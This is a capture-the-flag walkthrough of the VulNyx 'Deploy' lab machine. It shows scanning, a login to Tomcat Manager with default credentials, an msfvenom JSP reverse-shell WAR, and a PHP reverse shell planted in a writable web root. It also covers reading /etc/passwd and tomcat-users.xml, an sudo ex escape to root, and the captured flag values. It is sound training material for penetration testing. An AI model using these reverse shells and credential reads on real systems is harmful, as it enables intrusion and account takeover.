# VulNyx - Deploy

## Information
Deploy is vulnerable Linux virtual machine of low difficulty from the VulNyx platform, it was created by the `mow` user and works correctly on the VirtualBox and VMWare hypervisors.

## Solution
### Enumeration
`nmap` detects server 192.168.100.150 (internal domain: deploy.lan) running Linux (Debian 11 based OpenSSH version).
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sCV -p- -vv -T4 192.168.100.150
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-15 15:13 +07
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:13
Completed NSE at 15:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:13
Completed NSE at 15:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:13
Completed NSE at 15:13, 0.00s elapsed
Initiating ARP Ping Scan at 15:13
Scanning 192.168.100.150 [1 port]
Completed ARP Ping Scan at 15:13, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:13
Completed Parallel DNS resolution of 1 host. at 15:13, 0.01s elapsed
Initiating SYN Stealth Scan at 15:13
Scanning deploy.lan (192.168.100.150) [65535 ports]
Discovered open port 80/tcp on 192.168.100.150
Discovered open port 22/tcp on 192.168.100.150
Discovered open port 8080/tcp on 192.168.100.150
Completed SYN Stealth Scan at 15:14, 17.72s elapsed (65535 total ports)
Initiating Service scan at 15:14
Scanning 3 services on deploy.lan (192.168.100.150)
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Completed Service scan at 15:14, 6.48s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.100.150.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:14
Completed NSE at 15:14, 0.90s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:14
Completed NSE at 15:14, 0.05s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:14
Completed NSE at 15:14, 0.01s elapsed
Nmap scan report for deploy.lan (192.168.100.150)
Host is up, received arp-response (0.00088s latency).
Scanned at 2026-04-15 15:13:52 +07 for 25s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP4OvUJ0xKoulS7xOYz1485bm/ZBVN/86xLQvh7Gqa1DmEWz/eHP2C3MJQnqTFPOEh18FULOzj9fiehyzhd6CM7+qBZ/4B9b5RkOx7AL+S3aRIey4qQj7/k72PqMBkyfD2krjNOg7ZZe8z9o0A4VyeDljG6ukVFeN6PEtWWtdmmnVJztgzX0wPWPaO9GM5hITyvpIB/Y/IqueYR+ft2n5ROLLUfjFLezB+zSa6xkDPGiY9qMZBMXA/6oaaD3TV1x6jfTtZi+Aca0scDfOTJUVlSwZYaHrJQSNlKFJhniucqq/zxOnMIHjs/v1YXYCh0jlYDsb5J/NqTzEPMKkbtwn97T5/FQvsWDGJFTtxvCCrInmnUHB+cG8dSRYQZ763QoPxF/feDSNbrKjTv8D1K2EPhf1rBGQGIObgatVHNFclVWfuq7sn4x9olNnbsEogIQ5mbEq0mBlgOW5vowFxUkI60Ond4Dl7H4fkCeiPfngWFrT+6cQoNgA3HRKf6NtQeYs=
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNDNbes4gKOy7nXoXxW1kPwOX/vuxNkae5WSrIFu+ZD8OUIX5OK8e6o7IZDJAxn/ACAJL9Mm+tA44syyemA6C40=
|   256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINItrDSHbBfPB1CJosqklAQXN4/Mt++ocUqbiG861ZSG
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Debian Default Page: It works
8080/tcp open  http    syn-ack ttl 64 Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
MAC Address: 08:00:27:8E:59:08 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:14
Completed NSE at 15:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:14
Completed NSE at 15:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:14
Completed NSE at 15:14, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.27 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```
There are 3 open ports:
- 22/tcp: ssh - OpenSSH 8.4p1 Debian 5+debu11u1 
- 80/tcp: http - Apache httpd 2.4.56 (Debian) - This is Apache's default page when you have not configured a virtual host or deployed any applications.
- 8080/tcp http - Apache Tomcat - This is Apache Tomcat (popular Java server to run Java/Spring Boot web applications, JSP,...). Tomcat's default page is usually a management page or "Tomcat welcome page".

-> Port 8080 (Tomcat) is the most suspicious: there are often  vulnerabilities in Tomcat Manager.


Nikto is a web server vulnerability scanner that specializes in finding common issues such as misconfiguration, default files, missing security headers, dangerous HTTP methods, default accounts, etc.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nikto -C all -h 192.168.100.150:8080 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.100.150
+ Target Hostname:    192.168.100.150
+ Target Port:        8080
+ Start Time:         2026-04-15 15:17:39 (GMT7)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /: Appears to be a default Apache Tomcat install.
+ /manager/html: Default account found for 'Tomcat Manager Application' at (ID 'tomcat', PW 's3cret'). Apache Tomcat. See: CWE-16
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found.
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected).
+ /manager/status: Tomcat Server Status interface found (pass protected).
+ 26742 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2026-04-15 15:20:16 (GMT7) (157 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
This is the most dangerous discovery: **Tomcat Manager** (where applications are managed and deployed) is using the default account:
- Username: tomcat
- Password: s3cret
This is Tomcat's classic default credential pair.

**Tomcat Manager** allows users to upload WAR files (web application archive) and deploy new applications with just a few clicks.

### Shell (tomcat)
#### Tomcat
Accessing the address http://192.168.100.150:8080 on the browser we get:
![manager_webapp](/walkthroughs/vulnyx/low-difficulty/deploy/tomcat.png)

When identifying a Tomcat we go to the `/manager` path (manager webapp). We log in with the account and password we just found  above (`tomcat:s3cret`).
![manager_webapp](/walkthroughs/vulnyx/low-difficulty/deploy/manager-webapp.png)

#### Reverse Shell
##### Create WAR (msfvenom)
We create a `.war` reverse shell with `msfvenom`.
```bash
┌──(root㉿kali)-[/home/dungcngo]
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.100.172 LPORT=443 -f war > shell.war
Payload size: 1093 bytes
Final size of war file: 1093 bytes
```
This is the command to create payload (malicious code) with the `msfvenom` tool (belonging to Metasploit Framework) for the purpose of exploiting Tomcat.

##### Upload and Run WAR
Now we upload the `.war` file and when we deploy it we get a shell as a `tomcat` user.
![upload_file_war](/walkthroughs/vulnyx/low-difficulty/deploy/upload_war_file.png)

Use `nc` to open a listening socket on the machine's port 443 to wait for incoming TCP connections.
```bash                                                           
┌──(root㉿kali)-[/home/dungcngo]
└─# nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.100.172] from (UNKNOWN) [192.168.100.150] 39748
whoami
tomcat
hostname
deploy
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@deploy:/var/lib/tomcat9$ 
```
Visit http://192.168.100.150:8080/shell
![shell.war](/walkthroughs/vulnyx/low-difficulty/deploy/shell.png)

```bash
tomcat@deploy:/var/lib/tomcat9$ ls
ls
conf  lib  logs  policy  webapps  work
tomcat@deploy:/var/lib/tomcat9$ ls -la
ls -la
total 20
drwxr-xr-x  5 root   root   4096 abr 10 04:20 .
drwxr-xr-x 26 root   root   4096 may 10  2023 ..
lrwxrwxrwx  1 root   root     12 abr  5  2023 conf -> /etc/tomcat9
drwxr-xr-x  2 tomcat tomcat 4096 abr  5  2023 lib
lrwxrwxrwx  1 root   root     17 abr  5  2023 logs -> ../../log/tomcat9
drwxr-xr-x  2 root   root   4096 abr 10 04:20 policy
drwxrwxr-x  4 tomcat tomcat 4096 abr 15 10:31 webapps
lrwxrwxrwx  1 root   root     19 abr  5  2023 work -> ../../cache/tomcat9
tomcat@deploy:/var/lib/tomcat9$ 
```
We already have a reverse shell from the target machine to our machine. We move into Tomcat's configuration directory `/etc/tomcat9`, this is where the important configuration files of the Tomcat service are located.
```bash
tomcat@deploy:/var/lib/tomcat9$ cd /etc/tomcat9
cd /etc/tomcat9
tomcat@deploy:/etc/tomcat9$ ls
ls
Catalina             jaspic-providers.xml  server.xml
catalina.properties  logging.properties    tomcat-users.xml
context.xml          policy.d              web.xml
tomcat@deploy:/etc/tomcat9$ cat tomcat-users.xml 
cat tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>

<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
  <user username="tomcat" password="s3cret" roles="manager-gui"/>
  <!-- <user username="sa" password="salala!!" roles="manager-gui"/> -->
</tomcat-users>
tomcat@deploy:/etc/tomcat9$ 
```
When listing the content, we see files such as `server.xml`, `context.xml`, `web.xml` and especially `tomcat-users.xml`. This is the file used to define users, passwords and roles in Tomcat.

We can see another user commented `sa:salala!!`.

```bash
tomcat@deploy:/etc/tomcat9$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
toor:x:1000:1000:toor,,,:/home/toor:/bin/bash
tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin
sa:x:1001:1001::/home/sa:/usr/bin/bash
```
We can see `user` `sa` in the `/etc/passwd` file.

### Shell (sa)
We log in using SSH to the target machine with the account `sa`.
```bash
┌──(dungcngo㉿kali)-[~]
└─$ ssh sa@192.168.100.150 
The authenticity of host '192.168.100.150 (192.168.100.150)' can't be established.
ED25519 key fingerprint is: SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.150' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
sa@192.168.100.150's password: 
Linux deploy 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64
sa@deploy:~$ id; hostname
uid=1001(sa) gid=1001(sa) grupos=1001(sa)
deploy
sa@deploy:~$ 
```

```bash
sa@deploy:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  1.0 163736 10124 ?        Ss   abr14   0:04 /sbin/init
root           2  0.0  0.0      0     0 ?        S    abr14   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   abr14   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   abr14   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   abr14   0:00 [kworker/0:0H-even
root           8  0.0  0.0      0     0 ?        I<   abr14   0:00 [mm_percpu_wq]
root           9  0.0  0.0      0     0 ?        S    abr14   0:00 [rcu_tasks_rude_]
root          10  0.0  0.0      0     0 ?        S    abr14   0:00 [rcu_tasks_trace]
root          11  0.1  0.0      0     0 ?        S    abr14   1:25 [ksoftirqd/0]
root          12  0.0  0.0      0     0 ?        I    abr14   0:14 [rcu_sched]
root          13  0.0  0.0      0     0 ?        S    abr14   0:03 [migration/0]
root          15  0.0  0.0      0     0 ?        S    abr14   0:00 [cpuhp/0]
root          17  0.0  0.0      0     0 ?        S    abr14   0:00 [kdevtmpfs]
root          18  0.0  0.0      0     0 ?        I<   abr14   0:00 [netns]
root          19  0.0  0.0      0     0 ?        S    abr14   0:00 [kauditd]
root          20  0.0  0.0      0     0 ?        S    abr14   0:00 [khungtaskd]
root          21  0.0  0.0      0     0 ?        S    abr14   0:00 [oom_reaper]
root          22  0.0  0.0      0     0 ?        I<   abr14   0:00 [writeback]
root          23  0.0  0.0      0     0 ?        S    abr14   0:11 [kcompactd0]
root          24  0.0  0.0      0     0 ?        SN   abr14   0:00 [ksmd]
root          25  0.0  0.0      0     0 ?        SN   abr14   0:01 [khugepaged]
root          43  0.0  0.0      0     0 ?        I<   abr14   0:00 [kintegrityd]
root          44  0.0  0.0      0     0 ?        I<   abr14   0:00 [kblockd]
root          45  0.0  0.0      0     0 ?        I<   abr14   0:00 [blkcg_punt_bio]
root          46  0.0  0.0      0     0 ?        I<   abr14   0:00 [edac-poller]
root          47  0.0  0.0      0     0 ?        I<   abr14   0:00 [devfreq_wq]
root          48  0.0  0.0      0     0 ?        I<   abr14   0:34 [kworker/0:1H-kblo
root          51  0.0  0.0      0     0 ?        S    abr14   0:00 [kswapd0]
root          52  0.0  0.0      0     0 ?        I<   abr14   0:00 [kthrotld]
root          53  0.0  0.0      0     0 ?        I<   abr14   0:00 [acpi_thermal_pm]
root          54  0.0  0.0      0     0 ?        I<   abr14   0:00 [ipv6_addrconf]
root          64  0.0  0.0      0     0 ?        I<   abr14   0:00 [kstrp]
root          67  0.0  0.0      0     0 ?        I<   abr14   0:00 [zswap-shrink]
root          68  0.0  0.0      0     0 ?        I<   abr14   0:00 [kworker/u3:0]
root         105  0.0  0.0      0     0 ?        I<   abr14   0:00 [ata_sff]
root         106  0.0  0.0      0     0 ?        S    abr14   0:00 [scsi_eh_0]
root         107  0.0  0.0      0     0 ?        I<   abr14   0:00 [scsi_tmf_0]
root         108  0.0  0.0      0     0 ?        S    abr14   0:00 [scsi_eh_1]
root         109  0.0  0.0      0     0 ?        I<   abr14   0:00 [scsi_tmf_1]
root         111  0.0  0.0      0     0 ?        S    abr14   0:00 [scsi_eh_2]
root         112  0.0  0.0      0     0 ?        I<   abr14   0:00 [scsi_tmf_2]
root         148  0.0  0.0      0     0 ?        S    abr14   0:04 [jbd2/sda1-8]
root         149  0.0  0.0      0     0 ?        I<   abr14   0:00 [ext4-rsv-conver]
root         183  0.0  1.4  64800 13960 ?        Ss   abr14   0:06 /lib/systemd/syste
root         206  0.0  0.5  21600  5208 ?        Ss   abr14   0:00 /lib/systemd/syste
systemd+     230  0.0  0.6  88440  6040 ?        Ssl  abr14   0:00 /lib/systemd/syste
root         245  0.0  0.0      0     0 ?        I<   abr14   0:00 [cryptd]
root         254  0.0  0.0      0     0 ?        S    abr14   0:06 [irq/18-vmwgfx]
root         258  0.0  0.0      0     0 ?        I<   abr14   0:00 [ttm_swap]
root         260  0.0  0.0      0     0 ?        S    abr14   0:00 [card0-crtc0]
root         263  0.0  0.0      0     0 ?        S    abr14   0:00 [card0-crtc1]
root         265  0.0  0.0      0     0 ?        S    abr14   0:00 [card0-crtc2]
root         267  0.0  0.0      0     0 ?        S    abr14   0:00 [card0-crtc3]
root         270  0.0  0.0      0     0 ?        S    abr14   0:00 [card0-crtc4]
root         271  0.0  0.0      0     0 ?        S    abr14   0:00 [card0-crtc5]
root         272  0.0  0.0      0     0 ?        S    abr14   0:00 [card0-crtc6]
root         273  0.0  0.0      0     0 ?        S    abr14   0:00 [card0-crtc7]
root         305  0.0  0.2   6744  2936 ?        Ss   abr14   0:00 /usr/sbin/cron -f
message+     312  0.0  0.4   8276  4188 ?        Ss   abr14   0:00 /usr/bin/dbus-daem
root         315  0.0  0.5  99888  5892 ?        Ssl  abr14   0:00 /sbin/dhclient -4 
root         318  0.0  0.4 220796  4072 ?        Ssl  abr14   0:00 /usr/sbin/rsyslogd
root         324  0.0  0.7  22056  7208 ?        Ss   abr14   0:00 /lib/systemd/syste
root         347  0.0  0.1   5844  1680 tty1     Ss+  abr14   0:00 /sbin/agetty -o -p
root         376  0.0  0.7  13356  7720 ?        Ss   abr14   0:00 sshd: /usr/sbin/ss
tomcat       378  0.5 19.2 2312544 190452 ?      Ssl  abr14   7:12 /usr/lib/jvm/defau
root         424  0.0  2.0 194044 20456 ?        Ss   abr14   0:13 /usr/sbin/apache2 
toor        7375  0.0  1.2 194504 11884 ?        S    09:07   0:00 /usr/sbin/apache2 
toor        7376  0.0  1.2 194504 11888 ?        S    09:07   0:00 /usr/sbin/apache2 
toor        7377  0.0  1.2 194496 11864 ?        S    09:07   0:00 /usr/sbin/apache2 
toor        7378  0.0  1.2 194504 11876 ?        S    09:07   0:00 /usr/sbin/apache2 
toor        7379  0.0  1.2 194496 11864 ?        S    09:07   0:00 /usr/sbin/apache2 
root        7780  0.0  0.0      0     0 ?        I    10:12   0:00 [kworker/u2:3-even
toor        7796  0.0  1.1 194496 11580 ?        S    10:15   0:00 /usr/sbin/apache2 
root        7836  0.0  0.0      0     0 ?        I    10:22   0:00 [kworker/u2:1-flus
root        7861  0.0  0.0      0     0 ?        I    10:28   0:00 [kworker/u2:0-flus
root        7870  0.2  0.0      0     0 ?        I    10:30   0:01 [kworker/0:2-event
tomcat      7880  0.0  0.0   2480   512 ?        S    10:32   0:00 /bin/sh
root        7898  0.3  0.0      0     0 ?        I    10:35   0:01 [kworker/0:1-event
tomcat      7900  0.0  0.7  14772  7900 ?        S    10:35   0:00 python3 -c import 
tomcat      7901  0.0  0.3   7160  3864 pts/0    Ss+  10:35   0:00 /bin/bash
root        7915  0.0  0.9  14516  8964 ?        Ss   10:38   0:00 sshd: sa [priv]
sa          7918  0.0  0.8  15184  8080 ?        Ss   10:38   0:00 /lib/systemd/syste
sa          7919  0.0  0.2 166692  2640 ?        S    10:38   0:00 (sd-pam)
sa          7931  0.0  0.6  14716  6200 ?        R    10:38   0:00 sshd: sa@pts/1
sa          7932  0.0  0.4   7900  4712 pts/1    Ss   10:38   0:00 -bash
root        7994  0.2  0.0      0     0 ?        I    10:40   0:00 [kworker/0:0-ata_s
sa          8005  0.0  0.3   9756  3352 pts/1    R+   10:42   0:00 ps aux
```
Reviewing the process of the `user toor`, we see that he has an Apache2 HTTP server.

```bash
sa@deploy:~$ ls -la /var/www/html
total 20
drwxrwxrwx 2 www-data www-data  4096 may 11  2023 .
drwxrwxrwx 3 www-data www-data  4096 may 10  2023 ..
-rwxrwxrwx 1 www-data www-data 10701 may 10  2023 index.html
```
We have permission to write to the `/var/www/html` path.

Locate the PHP reverse shell scripts available in Kali, then copy and create a new script  on the `/var/www/html` of the user `sa`.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ locate php-reverse-shell.php
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php
```
![php-reverse-shell](/walkthroughs/vulnyx/low-difficulty/deploy/php-reverse-shell.png)

### Shell (toor)
We access the address `http://192.168.100.150/php-reverse-shell.php` in the browser then use `nc` to open the socket to listen for connections on the port 443, we get a reverse shell:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 443                        
listening on [any] 443 ...
connect to [192.168.100.172] from (UNKNOWN) [192.168.100.150] 60562
Linux deploy 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64 GNU/Linux
 10:53:07 up 20:59,  1 user,  load average: 0.01, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sa       pts/1    192.168.100.172  10:38   19.00s  0.20s  0.11s -bash
uid=1000(toor) gid=1000(toor) groups=1000(toor)
/bin/sh: 0: can't access tty; job control turned off
$
```
```bash
$ id ; whoami
uid=1000(toor) gid=1000(toor) groups=1000(toor)
toor
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
toor@deploy:/$ 
```

### Previlege Escalation
The `toor` user can run the `ex` binary as `root` with sudo.
```bash
toor@deploy:/$ sudo -l
sudo -l
Matching Defaults entries for toor on deploy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User toor may run the following commands on deploy:
    (root) NOPASSWD: /usr/bin/ex
toor@deploy:/$ sudo ex
sudo ex

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_ansi
Entering Ex mode.  Type "visual" to go to Normal mode.
```
When we run `ex` it opens in paginated mode and with `!/bin/bash` we become a `root` user.

```bash
# id; hostname
id; hostname
uid=0(root) gid=0(root) groups=0(root)
deploy
# ls
ls
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
# 
```
Check the location of files containing flags and read them.
```bash
# find / -name user.txt
find / -name user.txt
/home/toor/user.txt
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
0cb08f37a8e40c3e09a96e9e43b51750
# cat /home/toor/user.txt
cat /home/toor/user.txt
d9bad39df709796d0eccb92a55f85e73
```

***You are welcome!***



